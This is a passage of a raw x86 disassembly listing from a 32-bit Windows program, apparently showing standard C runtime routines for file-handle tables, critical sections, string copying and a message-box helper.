  4234d2:	je     0x4235c1
  4234d8:	mov    eax,DWORD PTR [esp+0x48]
  4234dc:	test   eax,eax
  4234de:	je     0x4235c1
  4234e4:	mov    edi,DWORD PTR [eax]
  4234e6:	lea    ebp,[eax+0x4]
  4234e9:	lea    eax,[edi+ebp*1]
  4234ec:	mov    DWORD PTR [esp+0x10],eax
  4234f0:	mov    eax,0x800
  4234f5:	cmp    edi,eax
  4234f7:	jl     0x4234fb
  4234f9:	mov    edi,eax
  4234fb:	cmp    DWORD PTR ds:0x45d148,edi
  423501:	jge    0x423551
  423503:	mov    esi,0x45d164
  423508:	push   ebx
  423509:	call   0x424582
  42350e:	test   eax,eax
  423510:	pop    ecx
  423511:	je     0x42354b
  423513:	add    DWORD PTR ds:0x45d148,0x20
  42351a:	mov    DWORD PTR [esi],eax
  42351c:	lea    ecx,[eax+0x480]
  423522:	jmp    0x42353a
  423524:	and    BYTE PTR [eax+0x4],0x0
  423528:	or     DWORD PTR [eax],0xffffffff
  42352b:	and    DWORD PTR [eax+0x8],0x0
  42352f:	mov    BYTE PTR [eax+0x5],0xa
  423533:	mov    ecx,DWORD PTR [esi]
  423535:	add    eax,0x24
  423538:	add    ecx,ebx
  42353a:	cmp    eax,ecx
  42353c:	jb     0x423524
  42353e:	add    esi,0x4
  423541:	cmp    DWORD PTR ds:0x45d148,edi
  423547:	jl     0x423508
  423549:	jmp    0x423551
  42354b:	mov    edi,DWORD PTR ds:0x45d148
  423551:	xor    ebx,ebx
  423553:	test   edi,edi
  423555:	jle    0x4235c1
  423557:	mov    eax,DWORD PTR [esp+0x10]
  42355b:	mov    eax,DWORD PTR [eax]
  42355d:	cmp    eax,0xffffffff
  423560:	je     0x4235b6
  423562:	mov    cl,BYTE PTR [ebp+0x0]
  423565:	test   cl,0x1
  423568:	je     0x4235b6
  42356a:	test   cl,0x8
  42356d:	jne    0x42357a
  42356f:	push   eax
  423570:	call   DWORD PTR ds:0x42805c
  423576:	test   eax,eax
  423578:	je     0x4235b6
  42357a:	mov    ecx,ebx
  42357c:	mov    eax,ebx
  42357e:	and    eax,0x1f
  423581:	lea    eax,[eax+eax*8]
  423584:	sar    ecx,0x5
  423587:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  42358e:	lea    esi,[ecx+eax*4]
  423591:	mov    eax,DWORD PTR [esp+0x10]
  423595:	mov    eax,DWORD PTR [eax]
  423597:	mov    DWORD PTR [esi],eax
  423599:	mov    al,BYTE PTR [ebp+0x0]
  42359c:	mov    BYTE PTR [esi+0x4],al
  42359f:	lea    eax,[esi+0xc]
  4235a2:	push   0xfa0
  4235a7:	push   eax
  4235a8:	call   0x4248ed
  4235ad:	test   eax,eax
  4235af:	pop    ecx
  4235b0:	pop    ecx
  4235b1:	je     0x4235e1
  4235b3:	inc    DWORD PTR [esi+0x8]
  4235b6:	add    DWORD PTR [esp+0x10],0x4
  4235bb:	inc    ebx
  4235bc:	inc    ebp
  4235bd:	cmp    ebx,edi
  4235bf:	jl     0x423557
  4235c1:	xor    ebx,ebx
  4235c3:	mov    ecx,DWORD PTR ds:0x45d160
  4235c9:	lea    eax,[ebx+ebx*8]
  4235cc:	lea    esi,[ecx+eax*4]
  4235cf:	cmp    DWORD PTR [esi],0xffffffff
  4235d2:	jne    0x423643
  4235d4:	test   ebx,ebx
  4235d6:	mov    BYTE PTR [esi+0x4],0x81
  4235da:	jne    0x4235e6
  4235dc:	push   0xfffffff6
  4235de:	pop    eax
  4235df:	jmp    0x4235f0
  4235e1:	or     eax,0xffffffff
  4235e4:	jmp    0x42365f
  4235e6:	mov    eax,ebx
  4235e8:	dec    eax
  4235e9:	neg    eax
  4235eb:	sbb    eax,eax
  4235ed:	add    eax,0xfffffff5
  4235f0:	push   eax
  4235f1:	call   DWORD PTR ds:0x428038
  4235f7:	mov    edi,eax
  4235f9:	cmp    edi,0xffffffff
  4235fc:	je     0x42363d
  4235fe:	push   edi
  4235ff:	call   DWORD PTR ds:0x42805c
  423605:	test   eax,eax
  423607:	je     0x42363d
  423609:	and    eax,0xff
  42360e:	cmp    eax,0x2
  423611:	mov    DWORD PTR [esi],edi
  423613:	jne    0x42361b
  423615:	or     BYTE PTR [esi+0x4],0x40
  423619:	jmp    0x423624
  42361b:	cmp    eax,0x3
  42361e:	jne    0x423624
  423620:	or     BYTE PTR [esi+0x4],0x8
  423624:	lea    eax,[esi+0xc]
  423627:	push   0xfa0
  42362c:	push   eax
  42362d:	call   0x4248ed
  423632:	test   eax,eax
  423634:	pop    ecx
  423635:	pop    ecx
  423636:	je     0x4235e1
  423638:	inc    DWORD PTR [esi+0x8]
  42363b:	jmp    0x423647
  42363d:	or     BYTE PTR [esi+0x4],0x40
  423641:	jmp    0x423647
  423643:	or     BYTE PTR [esi+0x4],0x80
  423647:	inc    ebx
  423648:	cmp    ebx,0x3
  42364b:	jl     0x4235c3
  423651:	push   DWORD PTR ds:0x45d148
  423657:	call   DWORD PTR ds:0x428058
  42365d:	xor    eax,eax
  42365f:	pop    edi
  423660:	pop    esi
  423661:	pop    ebp
  423662:	pop    ebx
  423663:	add    esp,0x48
  423666:	ret    
  423667:	push   0xc
  423669:	push   0x4284a0
  42366e:	call   0x423858
  423673:	mov    DWORD PTR [ebp-0x1c],0x428ef8
  42367a:	cmp    DWORD PTR [ebp-0x1c],0x428ef8
  423681:	jae    0x4236a5
  423683:	and    DWORD PTR [ebp-0x4],0x0
  423687:	mov    eax,DWORD PTR [ebp-0x1c]
  42368a:	mov    eax,DWORD PTR [eax]
  42368c:	test   eax,eax
  42368e:	je     0x42369b
  423690:	call   eax
  423692:	jmp    0x42369b
  423694:	xor    eax,eax
  423696:	inc    eax
  423697:	ret    
  423698:	mov    esp,DWORD PTR [ebp-0x18]
  42369b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42369f:	add    DWORD PTR [ebp-0x1c],0x4
  4236a3:	jmp    0x42367a
  4236a5:	call   0x423893
  4236aa:	ret    
  4236ab:	push   0xc
  4236ad:	push   0x4284b0
  4236b2:	call   0x423858
  4236b7:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236be:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236c5:	jae    0x4236e9
  4236c7:	and    DWORD PTR [ebp-0x4],0x0
  4236cb:	mov    eax,DWORD PTR [ebp-0x1c]
  4236ce:	mov    eax,DWORD PTR [eax]
  4236d0:	test   eax,eax
  4236d2:	je     0x4236df
  4236d4:	call   eax
  4236d6:	jmp    0x4236df
  4236d8:	xor    eax,eax
  4236da:	inc    eax
  4236db:	ret    
  4236dc:	mov    esp,DWORD PTR [ebp-0x18]
  4236df:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236e3:	add    DWORD PTR [ebp-0x1c],0x4
  4236e7:	jmp    0x4236be
  4236e9:	call   0x423893
  4236ee:	ret    
  4236ef:	call   0x423936
  4236f4:	mov    eax,ds:0x45c304
  4236f9:	cmp    eax,0xffffffff
  4236fc:	je     0x42370c
  4236fe:	push   eax
  4236ff:	call   DWORD PTR ds:0x428064
  423705:	or     DWORD PTR ds:0x45c304,0xffffffff
  42370c:	ret    
  42370d:	push   ebx
  42370e:	push   esi
  42370f:	call   DWORD PTR ds:0x428010
  423715:	push   DWORD PTR ds:0x45c304
  42371b:	mov    ebx,eax
  42371d:	call   DWORD PTR ds:0x428074
  423723:	mov    esi,eax
  423725:	test   esi,esi
  423727:	jne    0x423772
  423729:	push   0x88
  42372e:	push   0x1
  423730:	call   0x424978
  423735:	mov    esi,eax
  423737:	test   esi,esi
  423739:	pop    ecx
  42373a:	pop    ecx
  42373b:	je     0x42376a
  42373d:	push   esi
  42373e:	push   DWORD PTR ds:0x45c304
  423744:	call   DWORD PTR ds:0x428070
  42374a:	test   eax,eax
  42374c:	je     0x42376a
  42374e:	mov    DWORD PTR [esi+0x54],0x45c258
  423755:	mov    DWORD PTR [esi+0x14],0x1
  42375c:	call   DWORD PTR ds:0x42806c
  423762:	or     DWORD PTR [esi+0x4],0xffffffff
  423766:	mov    DWORD PTR [esi],eax
  423768:	jmp    0x423772
  42376a:	push   0x10
  42376c:	call   0x422920
  423771:	pop    ecx
  423772:	push   ebx
  423773:	call   DWORD PTR ds:0x428068
  423779:	mov    eax,esi
  42377b:	pop    esi
  42377c:	pop    ebx
  42377d:	ret    
  42377e:	call   0x4238ed
  423783:	test   eax,eax
  423785:	je     0x423797
  423787:	call   DWORD PTR ds:0x428078
  42378d:	cmp    eax,0xffffffff
  423790:	mov    ds:0x45c304,eax
  423795:	jne    0x42379f
  423797:	call   0x4236ef
  42379c:	xor    eax,eax
  42379e:	ret    
  42379f:	push   esi
  4237a0:	push   0x88
  4237a5:	push   0x1
  4237a7:	call   0x424978
  4237ac:	mov    esi,eax
  4237ae:	test   esi,esi
  4237b0:	pop    ecx
  4237b1:	pop    ecx
  4237b2:	je     0x4237e4
  4237b4:	push   esi
  4237b5:	push   DWORD PTR ds:0x45c304
  4237bb:	call   DWORD PTR ds:0x428070
  4237c1:	test   eax,eax
  4237c3:	je     0x4237e4
  4237c5:	mov    DWORD PTR [esi+0x54],0x45c258
  4237cc:	mov    DWORD PTR [esi+0x14],0x1
  4237d3:	call   DWORD PTR ds:0x42806c
  4237d9:	or     DWORD PTR [esi+0x4],0xffffffff
  4237dd:	mov    DWORD PTR [esi],eax
  4237df:	xor    eax,eax
  4237e1:	inc    eax
  4237e2:	pop    esi
  4237e3:	ret    
  4237e4:	call   0x4236ef
  4237e9:	xor    eax,eax
  4237eb:	pop    esi
  4237ec:	ret    
  4237ed:	cmp    DWORD PTR ds:0x45cac4,0x2
  4237f4:	jne    0x423803
  4237f6:	cmp    DWORD PTR ds:0x45cad0,0x5
  4237fd:	jb     0x423803
  4237ff:	xor    eax,eax
  423801:	inc    eax
  423802:	ret    
  423803:	push   0x3
  423805:	pop    eax
  423806:	ret    
  423807:	xor    eax,eax
  423809:	cmp    DWORD PTR [esp+0x4],eax
  42380d:	push   0x0
  42380f:	sete   al
  423812:	push   0x1000
  423817:	push   eax
  423818:	call   DWORD PTR ds:0x428080
  42381e:	test   eax,eax
  423820:	mov    ds:0x45d140,eax
  423825:	je     0x423851
  423827:	call   0x4237ed
  42382c:	cmp    eax,0x3
  42382f:	mov    ds:0x45d144,eax
  423834:	jne    0x423854
  423836:	push   0x3f8
  42383b:	call   0x424bfa
  423840:	test   eax,eax
  423842:	pop    ecx
  423843:	jne    0x423854
  423845:	push   DWORD PTR ds:0x45d140
  42384b:	call   DWORD PTR ds:0x42807c
  423851:	xor    eax,eax
  423853:	ret    
  423854:	xor    eax,eax
  423856:	inc    eax
  423857:	ret    
  423858:	push   0x425728
  42385d:	mov    eax,fs:0x0
  423863:	push   eax
  423864:	mov    eax,DWORD PTR [esp+0x10]
  423868:	mov    DWORD PTR [esp+0x10],ebp
  42386c:	lea    ebp,[esp+0x10]
  423870:	sub    esp,eax
  423872:	push   ebx
  423873:	push   esi
  423874:	push   edi
  423875:	mov    eax,DWORD PTR [ebp-0x8]
  423878:	mov    DWORD PTR [ebp-0x18],esp
  42387b:	push   eax
  42387c:	mov    eax,DWORD PTR [ebp-0x4]
  42387f:	mov    DWORD PTR [ebp-0x4],0xffffffff
  423886:	mov    DWORD PTR [ebp-0x8],eax
  423889:	lea    eax,[ebp-0x10]
  42388c:	mov    fs:0x0,eax
  423892:	ret    
  423893:	mov    ecx,DWORD PTR [ebp-0x10]
  423896:	mov    DWORD PTR fs:0x0,ecx
  42389d:	pop    ecx
  42389e:	pop    edi
  42389f:	pop    esi
  4238a0:	pop    ebx
  4238a1:	leave  
  4238a2:	push   ecx
  4238a3:	ret    
  4238a4:	int3   
  4238a5:	int3   
  4238a6:	int3   
  4238a7:	int3   
  4238a8:	int3   
  4238a9:	int3   
  4238aa:	int3   
  4238ab:	int3   
  4238ac:	int3   
  4238ad:	int3   
  4238ae:	int3   
  4238af:	int3   
  4238b0:	cmp    eax,0x1000
  4238b5:	jae    0x4238c5
  4238b7:	neg    eax
  4238b9:	add    eax,esp
  4238bb:	add    eax,0x4
  4238be:	test   DWORD PTR [eax],eax
  4238c0:	xchg   esp,eax
  4238c1:	mov    eax,DWORD PTR [eax]
  4238c3:	push   eax
  4238c4:	ret    
  4238c5:	push   ecx
  4238c6:	lea    ecx,[esp+0x8]
  4238ca:	sub    ecx,0x1000
  4238d0:	sub    eax,0x1000
  4238d5:	test   DWORD PTR [ecx],eax
  4238d7:	cmp    eax,0x1000
  4238dc:	jae    0x4238ca
  4238de:	sub    ecx,eax
  4238e0:	mov    eax,esp
  4238e2:	test   DWORD PTR [ecx],eax
  4238e4:	mov    esp,ecx
  4238e6:	mov    ecx,DWORD PTR [eax]
  4238e8:	mov    eax,DWORD PTR [eax+0x4]
  4238eb:	push   eax
  4238ec:	ret    
  4238ed:	push   esi
  4238ee:	push   edi
  4238ef:	xor    esi,esi
  4238f1:	mov    edi,0x45cc20
  4238f6:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  4238fe:	jne    0x42391e
  423900:	lea    eax,[esi*8+0x45c310]
  423907:	mov    DWORD PTR [eax],edi
  423909:	push   0xfa0
  42390e:	push   DWORD PTR [eax]
  423910:	add    edi,0x18
  423913:	call   0x4248ed
  423918:	test   eax,eax
  42391a:	pop    ecx
  42391b:	pop    ecx
  42391c:	je     0x42392a
  42391e:	inc    esi
  42391f:	cmp    esi,0x24
  423922:	jl     0x4238f6
  423924:	xor    eax,eax
  423926:	inc    eax
  423927:	pop    edi
  423928:	pop    esi
  423929:	ret    
  42392a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423932:	xor    eax,eax
  423934:	jmp    0x423927
  423936:	push   ebx
  423937:	mov    ebx,DWORD PTR ds:0x428060
  42393d:	push   esi
  42393e:	mov    esi,0x45c310
  423943:	push   edi
  423944:	mov    edi,DWORD PTR [esi]
  423946:	test   edi,edi
  423948:	je     0x42395d
  42394a:	cmp    DWORD PTR [esi+0x4],0x1
  42394e:	je     0x42395d
  423950:	push   edi
  423951:	call   ebx
  423953:	push   edi
  423954:	call   0x42446a
  423959:	and    DWORD PTR [esi],0x0
  42395c:	pop    ecx
  42395d:	add    esi,0x8
  423960:	cmp    esi,0x45c430
  423966:	jl     0x423944
  423968:	mov    esi,0x45c310
  42396d:	pop    edi
  42396e:	mov    eax,DWORD PTR [esi]
  423970:	test   eax,eax
  423972:	je     0x42397d
  423974:	cmp    DWORD PTR [esi+0x4],0x1
  423978:	jne    0x42397d
  42397a:	push   eax
  42397b:	call   ebx
  42397d:	add    esi,0x8
  423980:	cmp    esi,0x45c430
  423986:	jl     0x42396e
  423988:	pop    esi
  423989:	pop    ebx
  42398a:	ret    
  42398b:	push   ebp
  42398c:	mov    ebp,esp
  42398e:	mov    eax,DWORD PTR [ebp+0x8]
  423991:	push   DWORD PTR [eax*8+0x45c310]
  423998:	call   DWORD PTR ds:0x42808c
  42399e:	pop    ebp
  42399f:	ret    
  4239a0:	push   ebp
  4239a1:	mov    ebp,esp
  4239a3:	push   esi
  4239a4:	mov    esi,DWORD PTR [ebp+0x8]
  4239a7:	lea    esi,[esi*8+0x45c310]
  4239ae:	cmp    DWORD PTR [esi],0x0
  4239b1:	je     0x4239b8
  4239b3:	xor    eax,eax
  4239b5:	inc    eax
  4239b6:	jmp    0x423a1c
  4239b8:	push   edi
  4239b9:	push   0x18
  4239bb:	call   0x424582
  4239c0:	mov    edi,eax
  4239c2:	test   edi,edi
  4239c4:	pop    ecx
  4239c5:	jne    0x4239d6
  4239c7:	call   0x425800
  4239cc:	mov    DWORD PTR [eax],0xc
  4239d2:	xor    eax,eax
  4239d4:	jmp    0x423a1b
  4239d6:	push   0xa
  4239d8:	call   0x423a1f
  4239dd:	cmp    DWORD PTR [esi],0x0
  4239e0:	pop    ecx
  4239e1:	jne    0x423a09
  4239e3:	push   0xfa0
  4239e8:	push   edi
  4239e9:	call   0x4248ed
  4239ee:	test   eax,eax
  4239f0:	pop    ecx
  4239f1:	pop    ecx
  4239f2:	jne    0x423a05
  4239f4:	push   edi
  4239f5:	call   0x42446a
  4239fa:	push   0xa
  4239fc:	call   0x42398b
  423a01:	pop    ecx
  423a02:	pop    ecx
  423a03:	jmp    0x4239c7
  423a05:	mov    DWORD PTR [esi],edi
  423a07:	jmp    0x423a10
  423a09:	push   edi
  423a0a:	call   0x42446a
  423a0f:	pop    ecx
  423a10:	push   0xa
  423a12:	call   0x42398b
  423a17:	xor    eax,eax
  423a19:	pop    ecx
  423a1a:	inc    eax
  423a1b:	pop    edi
  423a1c:	pop    esi
  423a1d:	pop    ebp
  423a1e:	ret    
  423a1f:	push   ebp
  423a20:	mov    ebp,esp
  423a22:	mov    eax,DWORD PTR [ebp+0x8]
  423a25:	push   esi
  423a26:	lea    esi,[eax*8+0x45c310]
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	jne    0x423a45
  423a32:	push   eax
  423a33:	call   0x4239a0
  423a38:	test   eax,eax
  423a3a:	pop    ecx
  423a3b:	jne    0x423a45
  423a3d:	push   0x11
  423a3f:	call   0x422920
  423a44:	pop    ecx
  423a45:	push   DWORD PTR [esi]
  423a47:	call   DWORD PTR ds:0x428090
  423a4d:	pop    esi
  423a4e:	pop    ebp
  423a4f:	ret    
  423a50:	push   esi
  423a51:	push   DWORD PTR ds:0x45d268
  423a57:	call   0x4259b6
  423a5c:	pop    ecx
  423a5d:	mov    ecx,DWORD PTR ds:0x45d264
  423a63:	mov    esi,eax
  423a65:	mov    eax,ds:0x45d268
  423a6a:	mov    edx,ecx
  423a6c:	sub    edx,eax
  423a6e:	add    edx,0x4
  423a71:	cmp    esi,edx
  423a73:	jae    0x423ac3
  423a75:	mov    ecx,0x800
  423a7a:	cmp    esi,ecx
  423a7c:	jae    0x423a80
  423a7e:	mov    ecx,esi
  423a80:	add    ecx,esi
  423a82:	push   ecx
  423a83:	push   eax
  423a84:	call   0x425809
  423a89:	test   eax,eax
  423a8b:	pop    ecx
  423a8c:	pop    ecx
  423a8d:	jne    0x423aa6
  423a8f:	add    esi,0x10
  423a92:	push   esi
  423a93:	push   DWORD PTR ds:0x45d268
  423a99:	call   0x425809
  423a9e:	test   eax,eax
  423aa0:	pop    ecx
  423aa1:	pop    ecx
  423aa2:	jne    0x423aa6
  423aa4:	pop    esi
  423aa5:	ret    
  423aa6:	mov    ecx,DWORD PTR ds:0x45d264
  423aac:	sub    ecx,DWORD PTR ds:0x45d268
  423ab2:	mov    ds:0x45d268,eax
  423ab7:	sar    ecx,0x2
  423aba:	lea    ecx,[eax+ecx*4]
  423abd:	mov    DWORD PTR ds:0x45d264,ecx
  423ac3:	mov    DWORD PTR [ecx],edi
  423ac5:	add    DWORD PTR ds:0x45d264,0x4
  423acc:	mov    eax,edi
  423ace:	pop    esi
  423acf:	ret    
  423ad0:	push   0x80
  423ad5:	call   0x424582
  423ada:	test   eax,eax
  423adc:	pop    ecx
  423add:	mov    ds:0x45d268,eax
  423ae2:	jne    0x423ae8
  423ae4:	push   0x18
  423ae6:	pop    eax
  423ae7:	ret    
  423ae8:	and    DWORD PTR [eax],0x0
  423aeb:	mov    eax,ds:0x45d268
  423af0:	mov    ds:0x45d264,eax
  423af5:	xor    eax,eax
  423af7:	ret    
  423af8:	push   0xc
  423afa:	push   0x4284c0
  423aff:	call   0x423858
  423b04:	call   0x422b6b
  423b09:	and    DWORD PTR [ebp-0x4],0x0
  423b0d:	mov    edi,DWORD PTR [ebp+0x8]
  423b10:	call   0x423a50
  423b15:	mov    DWORD PTR [ebp-0x1c],eax
  423b18:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b1c:	call   0x423b2a
  423b21:	mov    eax,DWORD PTR [ebp-0x1c]
  423b24:	call   0x423893
  423b29:	ret    
  423b2a:	call   0x422b74
  423b2f:	ret    
  423b30:	push   DWORD PTR [esp+0x4]
  423b34:	call   0x423af8
  423b39:	neg    eax
  423b3b:	sbb    eax,eax
  423b3d:	neg    eax
  423b3f:	pop    ecx
  423b40:	dec    eax
  423b41:	ret    
  423b42:	push   ebp
  423b43:	mov    ebp,esp
  423b45:	sub    esp,0x10
  423b48:	push   ebx
  423b49:	xor    ebx,ebx
  423b4b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423b51:	push   esi
  423b52:	push   edi
  423b53:	jne    0x423bc2
  423b55:	push   0x428530
  423b5a:	call   DWORD PTR ds:0x428094
  423b60:	mov    edi,eax
  423b62:	cmp    edi,ebx
  423b64:	je     0x423bfd
  423b6a:	mov    esi,DWORD PTR ds:0x428018
  423b70:	push   0x428524
  423b75:	push   edi
  423b76:	call   esi
  423b78:	test   eax,eax
  423b7a:	mov    ds:0x45cd70,eax
  423b7f:	je     0x423bfd
  423b81:	push   0x428514
  423b86:	push   edi
  423b87:	call   esi
  423b89:	push   0x428500
  423b8e:	push   edi
  423b8f:	mov    ds:0x45cd74,eax
  423b94:	call   esi
  423b96:	cmp    DWORD PTR ds:0x45cac4,0x2
  423b9d:	mov    ds:0x45cd78,eax
  423ba2:	jne    0x423bc2
  423ba4:	push   0x4284e4
  423ba9:	push   edi
  423baa:	call   esi
  423bac:	test   eax,eax
  423bae:	mov    ds:0x45cd80,eax
  423bb3:	je     0x423bc2
  423bb5:	push   0x4284cc
  423bba:	push   edi
  423bbb:	call   esi
  423bbd:	mov    ds:0x45cd7c,eax
  423bc2:	mov    eax,ds:0x45cd7c
  423bc7:	test   eax,eax
  423bc9:	je     0x423c07
  423bcb:	call   eax
  423bcd:	test   eax,eax
  423bcf:	je     0x423bee
  423bd1:	lea    ecx,[ebp-0x4]
  423bd4:	push   ecx
  423bd5:	push   0xc
  423bd7:	lea    ecx,[ebp-0x10]
  423bda:	push   ecx
  423bdb:	push   0x1
  423bdd:	push   eax
  423bde:	call   DWORD PTR ds:0x45cd80
  423be4:	test   eax,eax
  423be6:	je     0x423bee
  423be8:	test   BYTE PTR [ebp-0x8],0x1
  423bec:	jne    0x423c07
  423bee:	cmp    DWORD PTR ds:0x45cad0,0x4
  423bf5:	jb     0x423c01
  423bf7:	or     BYTE PTR [ebp+0x12],0x20
  423bfb:	jmp    0x423c26
  423bfd:	xor    eax,eax
  423bff:	jmp    0x423c36
  423c01:	or     BYTE PTR [ebp+0x12],0x4
  423c05:	jmp    0x423c26
  423c07:	mov    eax,ds:0x45cd74
  423c0c:	test   eax,eax
  423c0e:	je     0x423c26
  423c10:	call   eax
  423c12:	mov    ebx,eax
  423c14:	test   ebx,ebx
  423c16:	je     0x423c26
  423c18:	mov    eax,ds:0x45cd78
  423c1d:	test   eax,eax
  423c1f:	je     0x423c26
  423c21:	push   ebx
  423c22:	call   eax
  423c24:	mov    ebx,eax
  423c26:	push   DWORD PTR [ebp+0x10]
  423c29:	push   DWORD PTR [ebp+0xc]
  423c2c:	push   DWORD PTR [ebp+0x8]
  423c2f:	push   ebx
  423c30:	call   DWORD PTR ds:0x45cd70
  423c36:	pop    edi
  423c37:	pop    esi
  423c38:	pop    ebx
  423c39:	leave  
  423c3a:	ret    
  423c3b:	int3   
  423c3c:	int3   
  423c3d:	int3   
  423c3e:	int3   
  423c3f:	int3   
  423c40:	push   edi
  423c41:	mov    edi,DWORD PTR [esp+0x8]
  423c45:	jmp    0x423cb5
  423c47:	lea    esp,[esp+0x0]
  423c4e:	mov    edi,edi
  423c50:	mov    ecx,DWORD PTR [esp+0x4]
  423c54:	push   edi
  423c55:	test   ecx,0x3
  423c5b:	je     0x423c70
  423c5d:	mov    al,BYTE PTR [ecx]
  423c5f:	add    ecx,0x1
  423c62:	test   al,al
  423c64:	je     0x423ca3
  423c66:	test   ecx,0x3
  423c6c:	jne    0x423c5d
  423c6e:	mov    edi,edi
  423c70:	mov    eax,DWORD PTR [ecx]
  423c72:	mov    edx,0x7efefeff
  423c77:	add    edx,eax
  423c79:	xor    eax,0xffffffff
  423c7c:	xor    eax,edx
  423c7e:	add    ecx,0x4
  423c81:	test   eax,0x81010100
  423c86:	je     0x423c70
  423c88:	mov    eax,DWORD PTR [ecx-0x4]
  423c8b:	test   al,al
  423c8d:	je     0x423cb2
  423c8f:	test   ah,ah
  423c91:	je     0x423cad
  423c93:	test   eax,0xff0000
  423c98:	je     0x423ca8
  423c9a:	test   eax,0xff000000
  423c9f:	je     0x423ca3
  423ca1:	jmp    0x423c70
  423ca3:	lea    edi,[ecx-0x1]
  423ca6:	jmp    0x423cb5
  423ca8:	lea    edi,[ecx-0x2]
  423cab:	jmp    0x423cb5
  423cad:	lea    edi,[ecx-0x3]
  423cb0:	jmp    0x423cb5
  423cb2:	lea    edi,[ecx-0x4]
  423cb5:	mov    ecx,DWORD PTR [esp+0xc]
  423cb9:	test   ecx,0x3
  423cbf:	je     0x423cde
  423cc1:	mov    dl,BYTE PTR [ecx]
  423cc3:	add    ecx,0x1
  423cc6:	test   dl,dl
  423cc8:	je     0x423d30
  423cca:	mov    BYTE PTR [edi],dl
  423ccc:	add    edi,0x1
  423ccf:	test   ecx,0x3
  423cd5:	jne    0x423cc1
  423cd7:	jmp    0x423cde
  423cd9:	mov    DWORD PTR [edi],edx
  423cdb:	add    edi,0x4
  423cde:	mov    edx,0x7efefeff
  423ce3:	mov    eax,DWORD PTR [ecx]
  423ce5:	add    edx,eax
  423ce7:	xor    eax,0xffffffff
  423cea:	xor    eax,edx
  423cec:	mov    edx,DWORD PTR [ecx]
  423cee:	add    ecx,0x4
  423cf1:	test   eax,0x81010100
  423cf6:	je     0x423cd9
  423cf8:	test   dl,dl
  423cfa:	je     0x423d30
  423cfc:	test   dh,dh
  423cfe:	je     0x423d27
  423d00:	test   edx,0xff0000
  423d06:	je     0x423d1a
  423d08:	test   edx,0xff000000
  423d0e:	je     0x423d12
  423d10:	jmp    0x423cd9
  423d12:	mov    DWORD PTR [edi],edx
  423d14:	mov    eax,DWORD PTR [esp+0x8]
  423d18:	pop    edi
  423d19:	ret    
  423d1a:	mov    WORD PTR [edi],dx
  423d1d:	mov    eax,DWORD PTR [esp+0x8]
  423d21:	mov    BYTE PTR [edi+0x2],0x0
  423d25:	pop    edi
  423d26:	ret    
  423d27:	mov    WORD PTR [edi],dx
  423d2a:	mov    eax,DWORD PTR [esp+0x8]
  423d2e:	pop    edi
  423d2f:	ret    
  423d30:	mov    BYTE PTR [edi],dl
  423d32:	mov    eax,DWORD PTR [esp+0x8]
  423d36:	pop    edi
  423d37:	ret    
  423d38:	int3   
  423d39:	int3   
  423d3a:	int3   
  423d3b:	int3   
  423d3c:	int3   
  423d3d:	int3   
  423d3e:	int3   
  423d3f:	int3   
  423d40:	mov    ecx,DWORD PTR [esp+0xc]
  423d44:	push   edi
  423d45:	test   ecx,ecx
  423d47:	je     0x423ddf
  423d4d:	push   esi
  423d4e:	push   ebx
  423d4f:	mov    ebx,ecx
  423d51:	mov    esi,DWORD PTR [esp+0x14]
  423d55:	test   esi,0x3
  423d5b:	mov    edi,DWORD PTR [esp+0x10]
  423d5f:	jne    0x423d6c
  423d61:	shr    ecx,0x2
  423d64:	jne    0x423def
  423d6a:	jmp    0x423d93
  423d6c:	mov    al,BYTE PTR [esi]
  423d6e:	add    esi,0x1
  423d71:	mov    BYTE PTR [edi],al
  423d73:	add    edi,0x1
  423d76:	sub    ecx,0x1
  423d79:	je     0x423da6
  423d7b:	test   al,al
  423d7d:	je     0x423dae
  423d7f:	test   esi,0x3
  423d85:	jne    0x423d6c
  423d87:	mov    ebx,ecx
  423d89:	shr    ecx,0x2
  423d8c:	jne    0x423def
  423d8e:	and    ebx,0x3
  423d91:	je     0x423da6
  423d93:	mov    al,BYTE PTR [esi]
  423d95:	add    esi,0x1
  423d98:	mov    BYTE PTR [edi],al
  423d9a:	add    edi,0x1
  423d9d:	test   al,al
  423d9f:	je     0x423dd8
  423da1:	sub    ebx,0x1
  423da4:	jne    0x423d93
  423da6:	mov    eax,DWORD PTR [esp+0x10]
  423daa:	pop    ebx
  423dab:	pop    esi
  423dac:	pop    edi
  423dad:	ret    
  423dae:	test   edi,0x3
  423db4:	je     0x423dcc
  423db6:	mov    BYTE PTR [edi],al
  423db8:	add    edi,0x1
  423dbb:	sub    ecx,0x1
  423dbe:	je     0x423e5c
  423dc4:	test   edi,0x3
  423dca:	jne    0x423db6
  423dcc:	mov    ebx,ecx
  423dce:	shr    ecx,0x2
  423dd1:	jne    0x423e47
  423dd3:	mov    BYTE PTR [edi],al
  423dd5:	add    edi,0x1
  423dd8:	sub    ebx,0x1
  423ddb:	jne    0x423dd3
  423ddd:	pop    ebx
  423dde:	pop    esi
  423ddf:	mov    eax,DWORD PTR [esp+0x8]
  423de3:	pop    edi
  423de4:	ret    
  423de5:	mov    DWORD PTR [edi],edx
  423de7:	add    edi,0x4
  423dea:	sub    ecx,0x1
  423ded:	je     0x423d8e
  423def:	mov    edx,0x7efefeff
  423df4:	mov    eax,DWORD PTR [esi]
  423df6:	add    edx,eax
  423df8:	xor    eax,0xffffffff
  423dfb:	xor    eax,edx
  423dfd:	mov    edx,DWORD PTR [esi]
  423dff:	add    esi,0x4
  423e02:	test   eax,0x81010100
  423e07:	je     0x423de5
  423e09:	test   dl,dl
  423e0b:	je     0x423e39
  423e0d:	test   dh,dh
  423e0f:	je     0x423e2f
  423e11:	test   edx,0xff0000
  423e17:	je     0x423e25
  423e19:	test   edx,0xff000000
  423e1f:	jne    0x423de5
  423e21:	mov    DWORD PTR [edi],edx
  423e23:	jmp    0x423e3d
  423e25:	and    edx,0xffff
  423e2b:	mov    DWORD PTR [edi],edx
  423e2d:	jmp    0x423e3d
  423e2f:	and    edx,0xff
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	jmp    0x423e3d
  423e39:	xor    edx,edx
  423e3b:	mov    DWORD PTR [edi],edx
  423e3d:	add    edi,0x4
